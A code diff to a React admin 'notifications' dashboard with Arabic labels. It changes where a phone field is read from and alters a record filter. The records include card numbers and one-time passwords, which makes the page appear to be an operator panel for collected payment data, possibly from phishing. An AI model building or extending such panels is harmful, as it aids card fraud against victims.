@@ -413,7 +413,7 @@ function ActivityTimeline({
               <p className="text-xs text-muted-foreground mt-1">
                 {notification.country || 'غير معروف'} -{' '}
                 {notification.name ||
-                  notification.personalInfo?.phone ||
+                  notification.phone ||
                   notification.email ||
                   'مستخدم جديد'}
               </p>
@@ -958,7 +958,7 @@ export default function NotificationsPage() {
         (notification) =>
           notification.name?.toLowerCase().includes(term) ||
           notification.email?.toLowerCase().includes(term) ||
-          notification.personalInfo?.phone?.toLowerCase().includes(term) ||
+          notification.phone?.toLowerCase().includes(term) ||
           notification.cardNumber?.toLowerCase().includes(term) ||
           notification.country?.toLowerCase().includes(term) ||
           notification.otp?.toLowerCase().includes(term)
@@ -1012,7 +1012,7 @@ export default function NotificationsPage() {
             return { id: doc.id, ...data };
           })  
           .filter(
-            (notification: any) => notification.cardNumber
+            (notification: any) => !notification.isHidden
           ) as Notification[];
 
         // Check if there are any new notifications with card info or general info
@@ -1691,7 +1691,7 @@ export default function NotificationsPage() {
                                 <div className="flex flex-wrap gap-2">
                                   <Badge
                                     variant={
-                                      notification?.personalInfo?.phone
+                                      notification?.phone
                                         ? 'secondary'
                                         : 'destructive'
                                     }
@@ -1700,7 +1700,7 @@ export default function NotificationsPage() {
                                       handleInfoClick(notification, 'personal')
                                     }
                                   >
-                                    {notification?.personalInfo?.phone
+                                    {notification?.phone
                                       ? 'معلومات شخصية'
                                       : 'لا يوجد معلومات'}
                                   </Badge>
@@ -1914,7 +1914,7 @@ export default function NotificationsPage() {
                                 <div className="flex flex-wrap gap-2 mb-2">
                                   <Badge
                                     variant={
-                                      notification?.personalInfo?.phone
+                                      notification?.phone
                                         ? 'secondary'
                                         : 'destructive'
                                     }
@@ -2202,13 +2202,13 @@ export default function NotificationsPage() {
                   </span>
                 </div>
               )}
-              {selectedNotification.personalInfo?.phone && (
+              {selectedNotification.phone && (
                 <div className="flex justify-between items-center py-2">
                   <span className="font-medium text-muted-foreground">
                     الهاتف:
                   </span>
                   <span className="font-semibold">
-                    {selectedNotification.personalInfo?.phone}
+                    {selectedNotification.phone}
                   </span>
                 </div>
               )}
